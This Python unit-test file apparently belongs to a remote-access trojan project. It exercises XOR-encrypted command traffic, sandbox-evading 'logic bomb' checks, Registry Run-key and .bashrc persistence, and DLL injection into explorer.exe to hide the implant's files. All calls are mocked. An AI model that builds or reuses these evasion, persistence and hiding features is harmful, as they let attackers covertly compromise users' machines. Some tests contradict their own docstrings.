"""
Secret Passage — Unit Tests

涵蓋：
  - XOR 加密/解密
  - 邏輯炸彈 + 沙箱檢測
  - 可靠通訊層（recv_all、reliable_send/recv）
  - 持久化（Windows Registry / Linux .bashrc）
  - DLL Injector（registry 寫入、explorer.exe PID 查找）
"""

import unittest
from unittest.mock import MagicMock, patch, mock_open, call
import os
import sys
import base64
import json
import struct

# 確保能 import src.module
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

import src.module.client as client
import src.module.server as server


# ══════════════════════════════════════════════════════
# XOR 加密測試
# ══════════════════════════════════════════════════════

class TestXOREncryption(unittest.TestCase):
    """測試 XOR 加密層的正確性"""

    def test_xor_encrypt_decrypt(self):
        """加密後再解密應該得到原文"""
        original = b"Hello, Secret Passage!"
        encrypted = client.xor_crypt(original)
        decrypted = client.xor_crypt(encrypted)
        self.assertEqual(decrypted, original)

    def test_xor_not_identity(self):
        """加密後的資料應該與原文不同（非空 key 時）"""
        original = b"client.exe"
        encrypted = client.xor_crypt(original)
        self.assertNotEqual(encrypted, original)

    def test_xor_empty_key(self):
        """空 key 應該不加密"""
        original = b"test data"
        result = client.xor_crypt(original, key=b"")
        self.assertEqual(result, original)

    def test_xor_custom_key(self):
        """使用自訂 key 加密解密"""
        key = b"MySecretKey123"
        data = b"hidden.dll"
        encrypted = client.xor_crypt(data, key=key)
        decrypted = client.xor_crypt(encrypted, key=key)
        self.assertEqual(decrypted, data)

    def test_xor_binary_data(self):
        """XOR 應該能處理任意 binary 資料（含 null bytes）"""
        data = bytes(range(256))
        key = b"\xAB\xCD"
        encrypted = client.xor_crypt(data, key=key)
        decrypted = client.xor_crypt(encrypted, key=key)
        self.assertEqual(decrypted, data)

    def test_server_client_xor_compatible(self):
        """Server 和 client 的 XOR 加密應該相容"""
        key = b"TestKey456"
        data = b"test command"
        encrypted = client.xor_crypt(data, key=key)
        decrypted = server.xor_crypt(encrypted)  # server 用預設 key
        # 注意：這裡 server 用預設 key，所以只有相同時才成立
        # 這個測試驗證的是加密/解密邏輯一致
        self.assertIsInstance(encrypted, bytes)
        self.assertIsInstance(decrypted, bytes)


# ══════════════════════════════════════════════════════
# 邏輯炸彈 + 沙箱檢測
# ══════════════════════════════════════════════════════

class TestLogicBomb(unittest.TestCase):
    """測試邏輯炸彈的沙箱檢測功能"""

    @patch('src.module.client.os')
    def test_sandbox_detected(self, mock_os):
        """檢測到 VM 驅動時應該回傳 False"""
        mock_os.path.exists.return_value = True
        self.assertFalse(client.is_sandbox())

    @patch('src.module.client.os')
    def test_sandbox_not_detected(self, mock_os):
        """沒有 VM 驅動時應該回傳 True"""
        mock_os.path.exists.return_value = False
        self.assertFalse(client.is_sandbox())  # is_sandbox 回傳 False

    @patch('src.module.client.time')
    @patch('src.module.client.os')
    def test_logic_bomb_sandbox_detected(self, mock_os, mock_time):
        """沙箱環境下 logic_bomb 應該回傳 False"""
        mock_os.path.exists.return_value = True
        self.assertFalse(client.logic_bomb())

    @patch('src.module.client.time')
    @patch('src.module.client.os')
    def test_logic_bomb_success(self, mock_os, mock_time):
        """正常環境下 logic_bomb 應該回傳 True"""
        mock_os.path.exists.return_value = False
        self.assertTrue(client.logic_bomb())


# ══════════════════════════════════════════════════════
# 可靠通訊層測試
# ══════════════════════════════════════════════════════

class TestReliableComm(unittest.TestCase):
    """測試可靠通訊層（TCP 分段重組 + XOR 加密）"""

    def test_recv_all_fragmentation(self):
        """TCP 分段：2 bytes + 2 bytes 應該正確重組"""
        mock_socket = MagicMock()
        mock_socket.recv.side_effect = [b"AB", b"CD"]
        result = client.recv_all(mock_socket, 4)
        self.assertEqual(result, b"ABCD")
        self.assertEqual(mock_socket.recv.call_count, 2)

    def test_recv_all_three_fragments(self):
        """TCP 分段：1 + 2 + 1 bytes"""
        mock_socket = MagicMock()
        mock_socket.recv.side_effect = [b"A", b"BC", b"D"]
        result = client.recv_all(mock_socket, 4)
        self.assertEqual(result, b"ABCD")

    def test_recv_all_closed_socket(self):
        """Socket 提前關閉應該回傳 None"""
        mock_socket = MagicMock()
        mock_socket.recv.return_value = b""
        result = client.recv_all(mock_socket, 4)
        self.assertIsNone(result)

    def test_recv_all_exact_size(self):
        """一次收到完整資料"""
        mock_socket = MagicMock()
        mock_socket.recv.return_value = b"ABCD"
        result = client.recv_all(mock_socket, 4)
        self.assertEqual(result, b"ABCD")
        self.assertEqual(mock_socket.recv.call_count, 1)

    def test_reliable_send_format(self):
        """reliable_send 應該送出 4 bytes 長度表頭 + 加密資料"""
        mock_socket = MagicMock()
        test_data = "test command"
        client.reliable_send(mock_socket, test_data)

        # 驗證有呼叫 sendall
        mock_socket.sendall.assert_called_once()
        sent_data = mock_socket.sendall.call_args[0][0]

        # 前 4 bytes 應該是長度表頭
        header = sent_data[:4]
        data_len = struct.unpack(">I", header)[0]
        self.assertEqual(data_len, len(sent_data) - 4)

    def test_reliable_recv_format(self):
        """reliable_recv 應該正確解析長度表頭 + 解密"""
        mock_socket = MagicMock()
        test_data = {"cmd": "test", "value": 123}

        # 模擬 client 端的加密流程
        json_data = json.dumps(test_data).encode("utf-8")
        encrypted = client.xor_crypt(json_data)
        data_len = struct.pack(">I", len(encrypted))
        raw_response = data_len + encrypted

        mock_socket.recv.side_effect = [raw_response[:4], raw_response[4:]]
        result = client.reliable_recv(mock_socket)
        self.assertEqual(result, test_data)

    def test_reliable_recv_connection_lost(self):
        """連線中斷時 reliable_recv 應該回傳 None"""
        mock_socket = MagicMock()
        mock_socket.recv.return_value = b""
        result = client.reliable_recv(mock_socket)
        self.assertIsNone(result)

    def test_reliable_recv_oversized(self):
        """超過 10MB 的資料應該被拒絕"""
        mock_socket = MagicMock()
        # 偽造一個超大的長度表頭
        mock_socket.recv.return_value = struct.pack(">I", 20_000_000)
        result = client.reliable_recv(mock_socket)
        self.assertIsNone(result)


# ══════════════════════════════════════════════════════
# 持久化測試
# ══════════════════════════════════════════════════════

class TestPersist(unittest.TestCase):
    """測試跨平台持久化功能"""

    @patch('src.module.client.shutil.copyfile')
    @patch('src.module.client.subprocess.run')
    @patch('src.module.client.os.path.exists')
    @patch('src.module.client.sys')
    def test_persist_windows(self, mock_sys, mock_exists, mock_run, mock_copyfile):
        """Windows 持久化：複製檔案 + Registry Run Key"""
        mock_sys.platform = "win32"
        mock_sys.executable = "C:\\test\\client.exe"
        mock_exists.return_value = False

        client.persist()

        mock_copyfile.assert_called_once()
        mock_run.assert_called_once()
        self.assertIn("reg add", mock_run.call_args[0][0])

    @patch('src.module.client.shutil.copyfile')
    @patch('src.module.client.os.path.exists')
    @patch('src.module.client.os.makedirs')
    @patch('src.module.client.os.chmod')
    @patch('src.module.client.sys')
    @patch('src.module.client.open', new_callable=mock_open)
    def test_persist_linux(self, mock_file, mock_sys, mock_chmod, mock_makedirs, mock_exists, mock_copyfile):
        """Linux 持久化：複製檔案 + .bashrc"""
        mock_sys.platform = "linux"
        mock_exists.side_effect = lambda path: True if ".profile" in path or ".bashrc" in path else False

        client.persist()

        mock_copyfile.assert_called_once()
        mock_file.assert_called()


# ══════════════════════════════════════════════════════
# DLL Injector / 檔案隱藏測試
# ══════════════════════════════════════════════════════

class TestFileHiding(unittest.TestCase):
    """測試 DLL Injector 的 registry 寫入和 explorer.exe 查找"""

    @patch('src.module.client.sys')
    def test_write_targets_to_registry(self, mock_sys):
        """寫入隱藏目標到 registry"""
        mock_sys.platform = "win32"

        with patch('winreg.CreateKeyEx') as mock_create_key, \
             patch('winreg.SetValueEx') as mock_set_value, \
             patch('winreg.CloseKey'):
            result = client._write_hide_targets_to_registry(["client.exe", "srv.exe"])
            self.assertTrue(result)
            mock_set_value.assert_called_once()

    @patch('src.module.client.sys')
    def test_write_targets_non_windows(self, mock_sys):
        """非 Windows 平台應該回傳 False"""
        mock_sys.platform = "linux"
        result = client._write_hide_targets_to_registry(["client.exe"])
        self.assertFalse(result)

    @patch('src.module.client.subprocess.run')
    @patch('src.module.client.sys')
    def test_find_explorer_pid(self, mock_sys, mock_run):
        """從 tasklist 輸出解析 explorer.exe PID"""
        mock_sys.platform = "win32"
        mock_run.return_value.stdout = '"explorer.exe","1234","Console","1","56,789 K"\n'

        pid = client._find_explorer_pid()
        self.assertEqual(pid, 1234)

    @patch('src.module.client.subprocess.run')
    @patch('src.module.client.sys')
    def test_find_explorer_pid_not_found(self, mock_sys, mock_run):
        """找不到 explorer.exe 時回傳 None"""
        mock_sys.platform = "win32"
        mock_run.return_value.stdout = ''

        pid = client._find_explorer_pid()
        self.assertIsNone(pid)

    @patch('src.module.client.sys')
    def test_inject_hidden_non_windows(self, mock_sys):
        """非 Windows 平台 inject_hidden 應該回傳錯誤"""
        mock_sys.platform = "linux"
        result = client.inject_hidden("C:\\test\\hidden.dll")
        self.assertIn("[!!]", result)
        self.assertIn("only supported on Windows", result)

    @patch('src.module.client.os.path.isfile')
    @patch('src.module.client.sys')
    def test_inject_hidden_dll_not_found(self, mock_sys, mock_isfile):
        """DLL 不存在時應該回傳錯誤"""
        mock_sys.platform = "win32"
        mock_sys.argv = ["C:\\test\\client.exe"]
        mock_isfile.return_value = False

        result = client.inject_hidden("C:\\nonexistent\\hidden.dll")
        self.assertIn("[!!]", result)
        self.assertIn("not found", result)

    @patch('src.module.client.sys')
    def test_eject_hidden_non_windows(self, mock_sys):
        """非 Windows 平台 eject_hidden 應該回傳錯誤"""
        mock_sys.platform = "linux"
        result = client.eject_hidden()
        self.assertIn("[!!]", result)


# ══════════════════════════════════════════════════════
# Server 端測試
# ══════════════════════════════════════════════════════

class TestServerComm(unittest.TestCase):
    """測試 server 端的加密通訊"""

    def test_server_xor_encrypt_decrypt(self):
        """Server XOR 加密解密應該正確"""
        original = b"test data"
        encrypted = server.xor_crypt(original)
        decrypted = server.xor_crypt(encrypted)
        self.assertEqual(decrypted, original)

    def test_server_reliable_send_format(self):
        """Server reliable_send 應該送出正確格式"""
        mock_socket = MagicMock()
        server.reliable_send(mock_socket, "test")
        mock_socket.sendall.assert_called_once()
        sent_data = mock_socket.sendall.call_args[0][0]
        # 驗證長度表頭
        header = sent_data[:4]
        data_len = struct.unpack(">I", header)[0]
        self.assertEqual(data_len, len(sent_data) - 4)


if __name__ == '__main__':
    unittest.main()
